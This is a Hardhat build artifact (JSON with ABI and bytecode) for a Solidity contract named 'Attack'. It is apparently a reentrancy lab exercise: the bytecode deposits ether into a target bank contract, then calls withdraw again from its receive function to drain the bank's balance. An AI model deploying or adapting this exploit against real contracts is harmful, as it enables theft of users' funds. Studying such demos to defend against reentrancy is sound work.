{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attack",
  "sourceName": "contracts/Attack.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_bankContractAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBankAddress",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBankBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getRandom",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50604051610650380380610650833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b610539806101176000396000f3fe60806040526004361061004e5760003560e01c806312065fe01461010557806366f780e9146101305780637b83b50b1461015b5780639e5faafc14610186578063aacc5a171461019057610100565b36610100576803cb71f51fc55800006100656101bb565b106100fe5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d678ac7230489e800006040518263ffffffff1660e01b81526004016100cb91906103e5565b600060405180830381600087803b1580156100e557600080fd5b505af11580156100f9573d6000803e3d6000fd5b505050505b005b600080fd5b34801561011157600080fd5b5061011a6101fb565b604051610127919061040f565b60405180910390f35b34801561013c57600080fd5b50610145610203565b604051610152919061046b565b60405180910390f35b34801561016757600080fd5b506101706101bb565b60405161017d919061040f565b60405180910390f35b61018e61022c565b005b34801561019c57600080fd5b506101a5610385565b6040516101b2919061040f565b60405180910390f35b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631905090565b600047905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b670de0b6b3a7640000341015610277576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161026e906104e3565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156102df57600080fd5b505af11580156102f3573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d346040518263ffffffff1660e01b8152600401610351919061040f565b600060405180830381600087803b15801561036b57600080fd5b505af115801561037f573d6000803e3d6000fd5b50505050565b60006803cb71f51fc5580000905090565b6000819050919050565b6000819050919050565b6000819050919050565b60006103cf6103ca6103c584610396565b6103aa565b6103a0565b9050919050565b6103df816103b4565b82525050565b60006020820190506103fa60008301846103d6565b92915050565b610409816103a0565b82525050565b60006020820190506104246000830184610400565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006104558261042a565b9050919050565b6104658161044a565b82525050565b6000602082019050610480600083018461045c565b92915050565b600082825260208201905092915050565b7f4465706f7369742031206f72206d6f7265207468616e20312065746865720000600082015250565b60006104cd601e83610486565b91506104d882610497565b602082019050919050565b600060208201905081810360008301526104fc816104c0565b905091905056fea2646970667358221220f36f89e39d81c3f839f03191589194f8067d37d3dc1068e76ca3b29f156eb57e64736f6c634300080b0033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}